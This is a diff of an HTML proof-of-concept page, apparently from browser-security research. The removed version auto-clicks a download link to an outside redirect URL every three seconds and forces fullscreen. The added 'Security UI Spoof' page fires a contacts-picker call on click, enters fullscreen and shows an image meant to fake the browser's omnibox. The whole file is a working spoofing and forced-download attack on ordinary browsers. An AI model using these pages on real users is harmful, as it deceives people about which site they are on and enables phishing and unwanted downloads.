@@ -1,18 +1,38 @@
-<html>
-<body>
-<h1>To Download File right click then open new window</h1>
-<a id='aid' style="opacity:1" targe="_blank" onclick="javascript:document.body.requestFullscreen();" href='https://cr.kungfoo.net/yao/downloads/multiple/redirect_download.php' download>redirect</a>
-</body>
-<script>
-var w=setInterval(function(){ document.getElementById("aid").click(); }, 3000);
-
-var x=setInterval(v,3700);
-
-function v(){ 
- document.write("<h2>This is Fake .....</h2><p>Have a nice day!</p>");
- clearInterval(x);
-// window.stop()
-}
-//setInterval(function(){ document.body.requestFullscreen(); }, 2000);
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spoof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
